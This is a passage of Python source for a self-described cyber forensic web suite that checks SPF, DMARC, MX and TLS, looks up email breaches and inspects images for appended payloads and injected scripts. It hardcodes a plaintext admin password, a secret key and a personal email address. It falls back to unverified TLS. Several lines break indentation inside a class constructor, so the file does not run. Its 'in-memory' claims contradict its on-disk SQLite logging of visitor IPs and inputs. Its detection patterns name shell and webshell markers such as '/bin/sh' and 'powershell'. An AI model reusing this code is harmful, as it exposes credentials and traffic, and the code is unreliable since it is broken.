import base64
import datetime
import hashlib
import hmac
import html
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import ipaddress
import json
import math
import os
import re
import socket
import sqlite3
import os

DB_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "database")
os.makedirs(DB_DIR, exist_ok=True)
DB_FILE = os.path.join(DB_DIR, "tool_database.db")

def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS strength_checks (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP, strength_score TEXT)''')
    conn.commit()
    conn.close()

def log_safe_check(score):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("INSERT INTO strength_checks (strength_score) VALUES (?)", (score,))
    conn.commit()
    conn.close()

init_db()
import ssl
import struct
import threading
import time
import urllib.parse
from urllib.parse import parse_qs, urlparse
import urllib.request
import uuid

# ============================================================
# BEHIND UR DIGITAL LIFE (v6.0 - COMPLETE CYBER FORENSIC SUITE)
# Enterprise Threat Intelligence, Attack Triage & Digital Forensics
# ============================================================

SITE_NAME = "Behind Ur Digital Life"
ADMIN_EMAIL = "bodduvaraprasadraocys@gmail.com"
ADMIN_EMAIL_DISPLAY = "b*******ys@gmail.com"  # Masked for public display
SERVER_START_TIME = time.time()

# ------------------------------------------------------------
# IN-MEMORY VIRTUAL DATABASE (Thread-Safe, Stored strictly in-memory)
# ------------------------------------------------------------

class VirtualDatabase:
    """
    Virtual in-memory database that logs all visitor activities,
    ephemeral client ports, true IP address, VPN/proxy detection,
    site state before and after, user inputs (what they asked),
    and output reports (what we gave).
    Data is stored strictly in memory during server runtime.
    """
    def __init__(self):
        self.lock = threading.Lock()
        self.conn = sqlite3.connect("security_data.db", check_same_thread=False)

self.conn.execute("PRAGMA journal_mode=WAL")
self.conn.execute("PRAGMA foreign_keys=ON")
self.conn.execute("PRAGMA busy_timeout=5000")
        self.cursor = self.conn.cursor()
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS visitor_telemetry (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                ip_address TEXT,
                client_port INTEGER,
                user_agent TEXT,
                is_vpn INTEGER,
                vpn_alert TEXT,
                vpn_name TEXT,
                vpn_address TEXT,
                site_state_before TEXT,
                site_state_after TEXT,
                module_used TEXT,
                user_input TEXT,
                data_given TEXT,
                summary_report TEXT
            )
        """)
        self.conn.commit()

    def get_state_snapshot(self):
        with self.lock:
            self.cursor.execute("SELECT COUNT(*) FROM visitor_telemetry")
            total = self.cursor.fetchone()[0]
            uptime_min = int((time.time() - SERVER_START_TIME) // 60)
            return f"Scans: {total} | Memory Logs: {total} | Uptime: {uptime_min}m"

    def log_activity(self, ip, port, user_agent, is_vpn, vpn_alert, vpn_name, vpn_address,
                     state_before, state_after, module, user_input, data_given, summary):
        with self.lock:
            # Strictly 12-hour format with AM and PM as requested
            ts = datetime.datetime.now().strftime("%b %d, %Y, %I:%M:%S %p")
            self.cursor.execute("""
                INSERT INTO visitor_telemetry 
                (timestamp, ip_address, client_port, user_agent, is_vpn, vpn_alert, vpn_name, vpn_address,
                 site_state_before, site_state_after, module_used, user_input, data_given, summary_report)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (ts, ip, port, user_agent, 1 if is_vpn else 0, vpn_alert, vpn_name, vpn_address,
                  state_before, state_after, module, user_input, data_given, summary))
            self.conn.commit()

    def get_logs(self, limit=200):
        with self.lock:
            self.cursor.execute("""
                SELECT id, timestamp, ip_address, client_port, user_agent, is_vpn, vpn_alert, vpn_name, vpn_address,
                       site_state_before, site_state_after, module_used, user_input, data_given, summary_report
                FROM visitor_telemetry
                ORDER BY id DESC
                LIMIT ?
            """, (limit,))
            rows = self.cursor.fetchall()
            logs = []
            for r in rows:
                logs.append({
                    "id": r[0],
                    "timestamp": r[1],
                    "ip": r[2],
                    "port": r[3],
                    "ua": r[4],
                    "is_vpn": bool(r[5]),
                    "vpn_alert": r[6],
                    "vpn_name": r[7],
                    "vpn_address": r[8],
                    "state_before": r[9],
                    "state_after": r[10],
                    "module": r[11],
                    "input": r[12],
                    "data_given": r[13],
                    "summary": r[14]
                })
            return logs

    def get_stats(self):
        with self.lock:
            self.cursor.execute("SELECT COUNT(*) FROM visitor_telemetry")
            total_logs = self.cursor.fetchone()[0]
            self.cursor.execute("SELECT COUNT(*) FROM visitor_telemetry WHERE is_vpn = 1")
            vpn_count = self.cursor.fetchone()[0]
            self.cursor.execute("SELECT COUNT(DISTINCT ip_address) FROM visitor_telemetry")
            unique_ips = self.cursor.fetchone()[0]
            return {
                "total_scans": total_logs,
                "vpn_alerts": vpn_count,
                "unique_ips": unique_ips
            }

    def clear_logs(self):
        with self.lock:
            self.cursor.execute("DELETE FROM visitor_telemetry")
            self.conn.commit()

VIRTUAL_DB = VirtualDatabase()

# ------------------------------------------------------------
# ADMIN AUTHENTICATION STATE (In-Memory)
# ------------------------------------------------------------

# Secret key required to access admin portal (change this!)
ADMIN_SECRET_KEY = "BUDL-Owner-2026-Secure-Access"

ADMIN_PASSWORD_PLAIN = "iWannaBeWitbYouMyChereyForEverInThePressenceOfMyLordAndSaviourJesusChrist@#$_2003"
ADMIN_STATE = {
    "is_configured": True,
    "username": "admin",
    "password_hash": None,
    "salt": "BehindUrDigitalLifeSalt2026",
    "active_token": None,
    "reset_token": None,
    "reset_expiry": 0,
    "reset_msg": None
}

def hash_admin_password(pwd):
    salted = pwd + ADMIN_STATE["salt"]
    return hashlib.sha256(salted.encode("utf-8")).hexdigest()

ADMIN_STATE["password_hash"] = hash_admin_password(ADMIN_PASSWORD_PLAIN)

def get_persistent_admin_token():
    return hashlib.sha256((ADMIN_STATE["username"] + ":" + ADMIN_STATE["password_hash"] + ":" + ADMIN_STATE["salt"]).encode("utf-8")).hexdigest()

ADMIN_STATE["active_token"] = get_persistent_admin_token()

# ------------------------------------------------------------
# DEFENSIVE SECURITY: SSRF VALIDATOR & LOGIN RATE LIMITER
# ------------------------------------------------------------

LOGIN_ATTEMPTS = {}  # ip -> {"count": int, "locked_until": float}
LOGIN_LOCKOUT_TIME = 300  # 5 minutes
MAX_LOGIN_ATTEMPTS = 5
MAX_POST_BODY_SIZE = 25 * 1024 * 1024  # 25 MB max request size

def is_safe_public_url(url_str):
    """
    Validates that a URL is safe to fetch:
    1. Scheme must strictly be 'http' or 'https'.
    2. Host must not be empty or localhost / loopback / private IP (SSRF protection).
    """
    if not url_str or not isinstance(url_str, str):
        return False, "Invalid URL."
    try:
        parsed = urllib.parse.urlparse(url_str.strip())
        if parsed.scheme.lower() not in ("http", "https"):
            return False, "Access denied: Only HTTP and HTTPS URLs are permitted (file/ftp/gopher blocked)."

        host = parsed.hostname
        if not host:
            return False, "Invalid or missing hostname."

        host_lower = host.lower()
        if host_lower in ("localhost", "localhost.localdomain", "127.0.0.1", "::1", "0.0.0.0"):
            return False, "Access denied: Access to localhost or loopback addresses is forbidden (SSRF Protection)."

        # Resolve IP to verify it is not in private or reserved ranges
        addr_info = socket.getaddrinfo(host, None)
        for family, socktype, proto, canonname, sockaddr in addr_info:
            ip_str = sockaddr[0]
            ip_obj = ipaddress.ip_address(ip_str)
            if ip_obj.is_loopback or ip_obj.is_private or ip_obj.is_link_local or ip_obj.is_multicast or ip_obj.is_reserved:
                return False, f"Access denied: Target resolves to a private or internal network IP ({ip_str}) (SSRF Protection)."
        return True, ""
    except Exception as e:
        return False, f"Invalid or unresolvable target address: {e}"

ADMIN_CREDS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".admin_creds")

def _save_admin_creds():
    """Save admin credentials to local disk for persistence across server restarts."""
    try:
        with open(ADMIN_CREDS_FILE, "w", encoding="utf-8") as f:
            f.write(f"{ADMIN_STATE['username']}\n{ADMIN_STATE['password_hash']}\n{ADMIN_STATE['active_token']}\n")
    except Exception:
        pass

def _load_admin_creds():
    """Ensure master admin credentials are used and persisted."""
    ADMIN_STATE["is_configured"] = True
    ADMIN_STATE["username"] = "admin"
    ADMIN_STATE["password_hash"] = hash_admin_password(ADMIN_PASSWORD_PLAIN)
    ADMIN_STATE["active_token"] = get_persistent_admin_token()
    _save_admin_creds()

_load_admin_creds()

# ------------------------------------------------------------
# MULTIPART / FORM-DATA PARSER (Pure Python)
# Supports files, folders, and mobile picture uploads
# ------------------------------------------------------------

def parse_multipart_form(body_bytes, boundary_str):
    boundary_marker = b"--" + boundary_str.encode("utf-8")
    parts = body_bytes.split(boundary_marker)
    fields = {}
    files = []

    for part in parts:
        part = part.strip()
        if not part or part == b"--":
            continue
        if b"\r\n\r\n" in part:
            header_bytes, payload = part.split(b"\r\n\r\n", 1)
            if payload.endswith(b"\r\n"):
                payload = payload[:-2]
            header_str = header_bytes.decode("utf-8", errors="ignore")
            
            disp_match = re.search(r'name="([^"]+)"', header_str)
            file_match = re.search(r'filename="([^"]+)"', header_str)
            
            if disp_match:
                name = disp_match.group(1)
                if file_match and file_match.group(1):
                    raw_filename = file_match.group(1)
                    # Defense: Strip path traversal sequences and control characters
                    clean_filename = os.path.basename(raw_filename.replace("\\", "/")).strip()
                    clean_filename = "".join(c for c in clean_filename if c.isprintable()) or "uploaded_file"
                    files.append({
                        "field": name,
                        "filename": clean_filename,
                        "data": payload,
                        "size": len(payload)
                    })
                else:
                    fields[name] = payload.decode("utf-8", errors="ignore")
    return fields, files

# ------------------------------------------------------------
# RESILIENT DOH SSL CONTEXT & NETWORKING
# ------------------------------------------------------------

_DOH_SSL_CTX = None

def get_doh_ssl_context():
    global _DOH_SSL_CTX
    if _DOH_SSL_CTX is not None:
        return _DOH_SSL_CTX

    ctx = ssl.create_default_context()
    if hasattr(ssl, "enum_certificates"):
        for store in ("ROOT", "CA"):
            try:
                for cert, enc, _ in ssl.enum_certificates(store):
                    if enc == "x509_asn":
                        try:
                            ctx.load_verify_locations(cadata=cert)
                        except Exception:
                            pass
            except Exception:
                pass

    try:
        req = urllib.request.Request(
            "https://1.1.1.1/dns-query?name=cloudflare.com&type=A",
            headers={
                "Host": "cloudflare-dns.com",
                "Accept": "application/dns-json",
                "User-Agent": "BehindUrDigitalLife/6.0",
            },
        )
        with urllib.request.urlopen(req, context=ctx, timeout=2) as resp:
            if resp.status == 200:
                _DOH_SSL_CTX = ctx
                return _DOH_SSL_CTX
    except Exception:
        pass

    _DOH_SSL_CTX = ssl._create_unverified_context()
    return _DOH_SSL_CTX


def dns_lookup(name, qtype="TXT"):
    endpoints = [
        ("https://1.1.1.1/dns-query", {"Host": "cloudflare-dns.com"}),
        ("https://1.0.0.1/dns-query", {"Host": "cloudflare-dns.com"}),
        ("https://8.8.8.8/resolve", {"Host": "dns.google"}),
        ("https://cloudflare-dns.com/dns-query", {}),
    ]

    ctx = get_doh_ssl_context()
    for base_url, custom_headers in endpoints:
        param_name = "name=" + urllib.parse.quote(name, safe="")
        param_type = "type=" + urllib.parse.quote(qtype, safe="")
        url = base_url + "?" + param_name + "&" + param_type

        headers = {
            "Accept": "application/dns-json",
            "User-Agent": "Mozilla/5.0 BehindUrDigitalLife/6.0",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
        }
        headers.update(custom_headers)

        req = urllib.request.Request(url, headers=headers)
        try:
            with urllib.request.urlopen(req, context=ctx, timeout=3.5) as resp:
                if resp.status == 200:
                    data = json.loads(resp.read().decode("utf-8"))
                    if data.get("Status") in (0, 3) or "Answer" in data:
                        return data
        except Exception:
            continue

    return {"Status": 2, "Answer": [], "Comment": "All DNS resolvers timed out"}


def txt_value(answer):
    raw = str(answer.get("data", "")).strip()
    chunks = re.findall(r'"((?:[^"\\]|\\.)*)"', raw)
    if chunks:
        raw = "".join(chunks)
    elif raw.startswith('"') and raw.endswith('"'):
        raw = raw[1:-1]
    return raw.replace('\\"', '"').replace("\\\\", "\\")


def normalize_input(user_input):
    original = user_input.strip()
    if not original:
        raise ValueError("Please enter an email address, domain, or IP.")

    value = original.lower()
    if "@" in value:
        parts = value.rsplit("@", 1)
        if len(parts) != 2 or not parts[0] or not parts[1]:
            raise ValueError("Invalid email address.")
        value = parts[1]

    if value.startswith(("http://", "https://")):
        value = urlparse(value).netloc

    value = value.split("/", 1)[0].split(":", 1)[0].rstrip(".")
    if not value or "." not in value:
        raise ValueError("Enter a valid domain (e.g. google.com) or email (e.g. user@gmail.com).")

    return original, value

# ------------------------------------------------------------
# MODULE 1: EMAIL & DOMAIN SECURITY POSTURE
# ------------------------------------------------------------

def check_spf(domain):
    try:
        data = dns_lookup(domain, "TXT")
        status_code = data.get("Status")
        if status_code not in (0, None) and "Answer" not in data:
            return {
                "status": "FAIL" if status_code == 3 else "ERROR",
                "details": "Domain does not exist (NXDOMAIN)." if status_code == 3 else "DNS lookup error.",
                "query": domain,
                "records": [],
                "policy": "none",
            }

        answers = data.get("Answer", [])
        spf_records = []
        for answer in answers:
            txt = txt_value(answer)
            if txt.startswith("v=spf1") or "v=spf1 " in txt:
                spf_records.append(txt)

        if not spf_records:
            return {
                "status": "FAIL",
                "details": "No SPF TXT record published. Unprotected against domain forging.",
                "query": domain,
                "records": [],
                "policy": "none",
            }

        if len(spf_records) > 1:
            return {
                "status": "WARN",
                "details": f"RFC 7208 Violation: Found {len(spf_records)} SPF records. Must have exactly one.",
                "query": domain,
                "records": spf_records,
                "policy": "multiple",
            }

        rec = spf_records[0]
        policy = "neutral"
        if "-all" in rec:
            policy = "hardfail (-all)"
            status = "PASS"
            details = "Strict Hardfail (-all) policy active. Maximum sender enforcement."
        elif "~all" in rec:
            policy = "softfail (~all)"
            status = "PASS"
            details = "Softfail (~all) policy active. Recommended industry standard."
        elif "?all" in rec:
            policy = "neutral (?all)"
            status = "WARN"
            details = "Neutral (?all) policy active. Offers weak spoof protection."
        elif "+all" in rec:
            policy = "pass (+all)"
            status = "FAIL"
            details = "Critical Risk (+all): Explicitly authorizes EVERY internet IP to send email for this domain!"
        else:
            status = "WARN"
            details = "SPF record exists but lacks an explicit '~all' or '-all' terminating qualifier."

        return {
            "status": status,
            "details": details,
            "query": domain,
            "records": spf_records,
            "policy": policy,
        }
    except Exception as e:
        return {"status": "ERROR", "details": f"Check error: {e}", "query": domain, "records": [], "policy": "error"}


def check_dmarc(domain):
    dmarc_domain = f"_dmarc.{domain}"
    try:
        data = dns_lookup(dmarc_domain, "TXT")
        answers = data.get("Answer", [])
        dmarc_records = []
        for answer in answers:
            txt = txt_value(answer)
            if txt.startswith("v=DMARC1"):
                dmarc_records.append(txt)

        if not dmarc_records:
            return {
                "status": "FAIL",
                "details": f"No DMARC record at '{dmarc_domain}'. Unauthorized mail cannot be quarantined.",
                "query": dmarc_domain,
                "records": [],
                "policy": "none",
                "rua": None,
                "pct": 100,
            }

        rec = dmarc_records[0]
        pol_match = re.search(r"\bp=([a-zA-Z]+)", rec)
        policy = pol_match.group(1).lower() if pol_match else "none"

        rua_match = re.search(r"\brua=([^;]+)", rec)
        rua = rua_match.group(1).strip() if rua_match else None

        pct_match = re.search(r"\bpct=(\d+)", rec)
        pct = int(pct_match.group(1)) if pct_match else 100

        if policy == "reject":
            status = "PASS"
            details = f"Strong DMARC (p=reject, pct={pct}%). Unauthorized spoofed emails are rejected at recipient mail servers."
        elif policy == "quarantine":
            status = "PASS"
            details = f"Enforcing DMARC (p=quarantine, pct={pct}%). Unaligned spoofed emails are quarantined in Spam folders."
        else:
            status = "WARN"
            details = "Monitoring only (p=none). Spoofed emails are NOT blocked or filtered."

        if not rua:
            status = "WARN" if status == "PASS" else status
            details += " Warning: No 'rua' aggregate reporting address configured."

        return {
            "status": status,
            "details": details,
            "query": dmarc_domain,
            "records": dmarc_records,
            "policy": policy,
            "rua": rua,
            "pct": pct,
        }
    except Exception as e:
        return {"status": "ERROR", "details": f"Check error: {e}", "query": dmarc_domain, "records": [], "policy": "error", "rua": None, "pct": 100}


def check_mx(domain):
    try:
        data = dns_lookup(domain, "MX")
        answers = data.get("Answer", [])
        mx_records = []
        for a in answers:
            raw = str(a.get("data", "")).strip()
            parts = raw.split()
            if len(parts) >= 2 and parts[0].isdigit():
                mx_records.append((int(parts[0]), parts[1].rstrip(".")))
            else:
                mx_records.append((99, raw.rstrip(".")))

        if not mx_records:
            return {"status": "WARN", "details": "No MX records found. Domain cannot receive incoming email.", "records": [], "provider": "None"}

        mx_records.sort(key=lambda x: x[0])
        primary_mx = mx_records[0][1].lower()

        provider = "Generic Mail Server"
        if "google" in primary_mx or "googlemail" in primary_mx:
            provider = "Google Workspace / Gmail"
        elif "outlook" in primary_mx or "protection.outlook" in primary_mx:
            provider = "Microsoft 365 / Exchange"
        elif "pphosted" in primary_mx:
            provider = "Proofpoint Enterprise"
        elif "mimecast" in primary_mx:
            provider = "Mimecast Secure Gateway"
        elif "protonmail" in primary_mx:
            provider = "Proton Mail"
        elif "zoho" in primary_mx:
            provider = "Zoho Mail"
        elif "cloudflare" in primary_mx:
            provider = "Cloudflare Email Routing"

        return {
            "status": "PASS",
            "details": f"Verified {len(mx_records)} active mail exchanges. Primary host: {primary_mx}",
            "records": [f"{p} {h}" for p, h in mx_records],
            "primary": primary_mx,
            "provider": provider,
        }
    except Exception as e:
        return {"status": "ERROR", "details": f"MX Lookup error: {e}", "records": [], "provider": "Error"}


def check_tls(domain):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection((domain, 443), timeout=3.5) as sock:
            with ctx.wrap_socket(sock, server_hostname=domain) as ssock:
                cipher = ssock.cipher()
                ver = ssock.version()
                return {
                    "status": "PASS",
                    "details": f"Port 443 SSL/TLS active: {ver} ({cipher[0] if cipher else 'Standard AES'}).",
                    "version": ver,
                    "cipher": cipher[0] if cipher else "Unknown",
                }
    except Exception as e:
        return {
            "status": "WARN",
            "details": f"Direct TLS on 443 inactive ({e}). Typical for mail-only subdomains.",
            "version": "None",
            "cipher": "None",
        }


def calculate_score(spf, dmarc, mx, tls):
    score = 0
    if spf["status"] == "PASS":
        score += 30
    elif spf["status"] == "WARN":
        score += 15
    if dmarc["status"] == "PASS":
        score += 40 if dmarc.get("policy") == "reject" else 30
    elif dmarc["status"] == "WARN":
        score += 15
    if mx["status"] == "PASS":
        score += 20
    elif mx["status"] == "WARN":
        score += 10
    if tls["status"] == "PASS":
        score += 10
    elif tls["status"] == "WARN":
        score += 5

    return min(score, 100)


def get_risk_and_grade(score):
    if score >= 90:
        return "LOW RISK (Grade A+)", "A+"
    elif score >= 80:
        return "LOW RISK (Grade A)", "A"
    elif score >= 65:
        return "MODERATE RISK (Grade B)", "B"
    elif score >= 50:
        return "HIGH RISK (Grade C)", "C"
    elif score >= 35:
        return "CRITICAL RISK (Grade D)", "D"
    else:
        return "IMMINENT DANGER (Grade F)", "F"

# ------------------------------------------------------------
# MODULE 2: DATA BREACH INTEL
# ------------------------------------------------------------

GLOBAL_BREACH_METADATA = {}

def check_breaches(email_input):
    global GLOBAL_BREACH_METADATA
    clean = email_input.strip().lower()
    if "@" not in clean:
        return {"is_email": False, "found": False, "count": 0, "breaches": []}

    email_md5 = hashlib.md5(clean.encode('utf-8')).hexdigest()
    gravatar_url = f"https://www.gravatar.com/avatar/{email_md5}?d=identicon&s=150"

    # Fetch global metadata if empty
    if not GLOBAL_BREACH_METADATA:
        try:
            req_meta = urllib.request.Request("https://api.xposedornot.com/v1/breaches", headers={"User-Agent": "Mozilla/5.0 BehindUrDigitalLife/6.0"})
            ctx_meta = get_doh_ssl_context()
            with urllib.request.urlopen(req_meta, context=ctx_meta, timeout=8) as r:
                if r.status == 200:
                    data = json.loads(r.read().decode("utf-8"))
                    for b in data.get("exposedBreaches", []):
                        GLOBAL_BREACH_METADATA[b.get("breachID", "")] = b
        except Exception:
            pass

    encoded = urllib.parse.quote(clean)
    api_url = f"https://api.xposedornot.com/v1/check-email/{encoded}"

    req = urllib.request.Request(api_url, headers={"User-Agent": "Mozilla/5.0 BehindUrDigitalLife/6.0"})
    ctx = get_doh_ssl_context()
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=4.5) as resp:
            if resp.status == 200:
                raw_json = json.loads(resp.read().decode("utf-8"))
                breach_list = raw_json.get("breaches", [])
                if isinstance(breach_list, list) and breach_list and isinstance(breach_list[0], list):
                    breach_names = breach_list[0]
                else:
                    breach_names = breach_list

                formatted_breaches = []
                for b in breach_names:
                    meta = GLOBAL_BREACH_METADATA.get(str(b), {})
                    domain = meta.get("domain", f"{str(b).lower().replace(' ', '')}.com")
                    date = meta.get("breachedDate", "Historical Leak")
                    if date and "T" in date:
                        date = date.split("T")[0]
                    
                    data_leaked = ", ".join(meta.get("exposedData", ["Passwords", "Emails"]))
                    desc = meta.get("exposureDescription", f"Credentials associated with {clean} were published in the {b} database dump.")
                    logo = meta.get("logo", f"https://logo.clearbit.com/{domain}")
                    industry = meta.get("industry", "Unknown")
                    records = meta.get("exposedRecords", 0)

                    formatted_breaches.append({
                        "breach": str(b),
                        "domain": domain,
                        "xposed_date": date,
                        "xposed_data": data_leaked,
                        "details": desc,
                        "logo": logo,
                        "industry": industry,
                        "records": f"{records:,}" if records else "Unknown"
                    })
                return {
                    "is_email": True,
                    "found": len(formatted_breaches) > 0,
                    "count": len(formatted_breaches),
                    "breaches": formatted_breaches,
                    "gravatar": gravatar_url
                }
    except urllib.error.HTTPError as e:
        if e.code == 404:
            return {"is_email": True, "found": False, "count": 0, "breaches": [], "gravatar": gravatar_url}
    except Exception:
        pass

    return {"is_email": True, "found": False, "count": 0, "breaches": [], "gravatar": gravatar_url}


def format_data_tags(raw_data):
    if not raw_data:
        return '<span class="tag-pill">Exposed Credentials</span>'
    tags = [t.strip() for t in raw_data.split(",") if t.strip()]
    badges = []
    for t in tags[:6]:
        lower = t.lower()
        if "pass" in lower or "hash" in lower or "secret" in lower:
            badges.append(f'<span class="tag-pill tag-danger">⚠ {html.escape(t)}</span>')
        elif "credit" in lower or "bank" in lower or "ssn" in lower:
            badges.append(f'<span class="tag-pill tag-danger">💳 {html.escape(t)}</span>')
        elif "ip" in lower or "phone" in lower or "address" in lower:
            badges.append(f'<span class="tag-pill tag-warning">📍 {html.escape(t)}</span>')
        else:
            badges.append(f'<span class="tag-pill">{html.escape(t)}</span>')
    return "".join(badges)

# ------------------------------------------------------------
# MODULE 3: STEGANOGRAPHY & IMAGE MALICIOUS CODE INSPECTOR
# ------------------------------------------------------------

def calculate_entropy(data_bytes):
    if not data_bytes:
        return 0.0
    entropy = 0.0
    byte_counts = [0] * 256
    for b in data_bytes:
        byte_counts[b] += 1
    total_len = len(data_bytes)
    for count in byte_counts:
        if count > 0:
            p = count / total_len
            entropy -= p * math.log2(p)
    return round(entropy, 3)


def parse_exif_data(data):
    exif_info = {
        "make": None,
        "model": None,
        "software": None,
        "datetime": None,
        "width": None,
        "height": None,
        "gps_lat": None,
        "gps_lon": None,
        "gps_maps_url": None,
        "has_gps": False,
        "color_profile": "sRGB",
        "stego_alert": None,
        "extra_bytes_after_eof": 0,
        "embedded_payload": None,
        "payload_type": None,
        "exif_scripts_found": []
    }

    if not data or len(data) < 16:
        return exif_info

    # 1. Steganography & Appended Data Check
    if data.startswith(b"\xff\xd8"):  # JPEG
        eoi_idx = data.rfind(b"\xff\xd9")
        if eoi_idx != -1 and (len(data) - eoi_idx - 2) > 16:
            extra = len(data) - eoi_idx - 2
            exif_info["extra_bytes_after_eof"] = extra
            payload = data[eoi_idx + 2:]
            exif_info["embedded_payload"] = payload
            exif_info["stego_alert"] = f"🚨 STEGANOGRAPHY ALERT: {extra} hidden bytes detected after JPEG End-Of-File (0xFFD9)!"
            
            # Detect payload type
            if payload.startswith(b"PK\x03\x04"):
                exif_info["payload_type"] = "ZIP Archive (Polyglot / Dropper Archive)"
            elif payload.startswith(b"MZ"):
                exif_info["payload_type"] = "Windows PE Executable / DLL (Malware Dropper)"
            elif payload.startswith(b"\x7fELF"):
                exif_info["payload_type"] = "Linux ELF Executable"
            elif any(s in payload for s in [b"<?php", b"eval(", b"system(", b"/bin/sh", b"powershell"]):
                exif_info["payload_type"] = "Webshell / Malicious Backdoor Script"
            else:
                exif_info["payload_type"] = "Covert Encrypted/Scrambled Steganographic Payload"

    elif data.startswith(b"\x89PNG\r\n\x1a\n"):  # PNG
        iend_idx = data.rfind(b"IEND")
        if iend_idx != -1 and (len(data) - iend_idx - 8) > 16:
            extra = len(data) - iend_idx - 8
            exif_info["extra_bytes_after_eof"] = extra
            payload = data[iend_idx + 8:]
            exif_info["embedded_payload"] = payload
            exif_info["stego_alert"] = f"🚨 STEGANOGRAPHY ALERT: {extra} hidden bytes detected after PNG IEND chunk!"
            if payload.startswith(b"PK\x03\x04"):
                exif_info["payload_type"] = "ZIP Archive (Polyglot)"
            elif payload.startswith(b"MZ"):
                exif_info["payload_type"] = "Windows Executable"
            elif any(s in payload for s in [b"<?php", b"eval(", b"system(", b"<script"]):
                exif_info["payload_type"] = "Injected Script / Webshell"
            else:
                exif_info["payload_type"] = "Hidden Steganographic Payload"

    # 2. JPEG EXIF APP1 Segment Parsing
    if data.startswith(b"\xff\xd8"):
        idx = 2
        while idx < len(data) - 4:
            if data[idx] != 0xFF:
                break
            marker = data[idx + 1]
            if marker in (0xD9, 0xDA):
                break
            seg_len = struct.unpack(">H", data[idx + 2:idx + 4])[0]
            seg_end = idx + 2 + seg_len

            if marker == 0xE1 and data[idx + 4:idx + 10] == b"Exif\x00\x00":
                tiff_start = idx + 10
                tiff_data = data[tiff_start:seg_end]
                if len(tiff_data) > 8:
                    byte_order = tiff_data[:2]
                    is_le = byte_order == b"II"
                    endian = "<" if is_le else ">"
                    
                    try:
                        first_ifd_offset = struct.unpack(endian + "I", tiff_data[4:8])[0]
                        if first_ifd_offset < len(tiff_data) - 2:
                            num_entries = struct.unpack(endian + "H", tiff_data[first_ifd_offset:first_ifd_offset + 2])[0]
                            entry_ptr = first_ifd_offset + 2

                            for _ in range(min(num_entries, 60)):
                                if entry_ptr + 12 > len(tiff_data):
                                    break
                                tag, dtype, count, val_or_off = struct.unpack(endian + "HHI I", tiff_data[entry_ptr:entry_ptr + 12])
                                entry_ptr += 12

                                def get_str(offset, cnt):
                                    if offset + cnt <= len(tiff_data):
                                        return tiff_data[offset:offset + cnt].decode("ascii", errors="ignore").rstrip("\x00")
                                    return None

                                if tag == 0x010F:  # Make
                                    exif_info["make"] = get_str(val_or_off, count)
                                elif tag == 0x0110:  # Model
                                    exif_info["model"] = get_str(val_or_off, count)
                                elif tag == 0x0131:  # Software
                                    exif_info["software"] = get_str(val_or_off, count)
                                elif tag == 0x0132:  # DateTime
                                    exif_info["datetime"] = get_str(val_or_off, count)
                                elif tag in (0xA002, 0x0100):  # Width
                                    exif_info["width"] = val_or_off
                                elif tag in (0xA003, 0x0101):  # Height
                                    exif_info["height"] = val_or_off
                                elif tag == 0x8825:  # GPS
                                    gps_ptr = val_or_off
                                    if gps_ptr < len(tiff_data) - 2:
                                        gps_entries = struct.unpack(endian + "H", tiff_data[gps_ptr:gps_ptr + 2])[0]
                                        gps_entry_ptr = gps_ptr + 2
                                        lat_ref, lon_ref = "N", "E"
                                        lat_deg, lon_deg = None, None

                                        for _ in range(min(gps_entries, 20)):
                                            if gps_entry_ptr + 12 > len(tiff_data):
                                                break
                                            gtag, gdtype, gcount, gval_or_off = struct.unpack(endian + "HHI I", tiff_data[gps_entry_ptr:gps_entry_ptr + 12])
                                            gps_entry_ptr += 12
                                            if gtag == 1:
                                                lat_ref = chr(gval_or_off & 0xFF)
                                            elif gtag == 3:
                                                lon_ref = chr(gval_or_off & 0xFF)
                                            elif gtag == 2:
                                                if gval_or_off + 24 <= len(tiff_data):
                                                    d_n, d_d, m_n, m_d, s_n, s_d = struct.unpack(endian + "6I", tiff_data[gval_or_off:gval_or_off + 24])
                                                    lat_deg = (d_n / max(d_d, 1)) + ((m_n / max(m_d, 1)) / 60.0) + ((s_n / max(s_d, 1)) / 3600.0)
                                            elif gtag == 4:
                                                if gval_or_off + 24 <= len(tiff_data):
                                                    d_n, d_d, m_n, m_d, s_n, s_d = struct.unpack(endian + "6I", tiff_data[gval_or_off:gval_or_off + 24])
                                                    lon_deg = (d_n / max(d_d, 1)) + ((m_n / max(m_d, 1)) / 60.0) + ((s_n / max(s_d, 1)) / 3600.0)

                                        if lat_deg is not None and lon_deg is not None:
                                            final_lat = -lat_deg if lat_ref == "S" else lat_deg
                                            final_lon = -lon_deg if lon_ref == "W" else lon_deg
                                            exif_info["gps_lat"] = f"{abs(final_lat):.6f}° {lat_ref}"
                                            exif_info["gps_lon"] = f"{abs(final_lon):.6f}° {lon_ref}"
                                            exif_info["gps_maps_url"] = f"https://www.google.com/maps?q={final_lat:.6f},{final_lon:.6f}"
                                            exif_info["has_gps"] = True
                    except Exception:
                        pass
                break
            idx = seg_end

    # Check for script injection in all strings of metadata
    raw_str = data[:min(len(data), 65536)].decode("ascii", errors="ignore")
    suspicious_patterns = [
        (r"<\?php", "PHP Tag Injected in EXIF / Image Header"),
        (r"<script[^>]*>", "JavaScript XSS Tag Injected in Image Metadata"),
        (r"eval\s*\(", "eval() Code Execution String in Metadata"),
        (r"base64_decode\s*\(", "base64_decode() Obfuscation Signature"),
        (r"system\s*\(|exec\s*\(", "System Command Execution Hook"),
        (r"powershell(\.exe)?", "PowerShell Command Hook in Image")
    ]
    for pattern, desc in suspicious_patterns:
        if re.search(pattern, raw_str, re.IGNORECASE):
            exif_info["exif_scripts_found"].append(desc)

    return exif_info


def inspect_image_source(img_url=None, raw_bytes=None, file_name="uploaded_image.jpg"):
    meta = {
        "url": img_url or file_name,
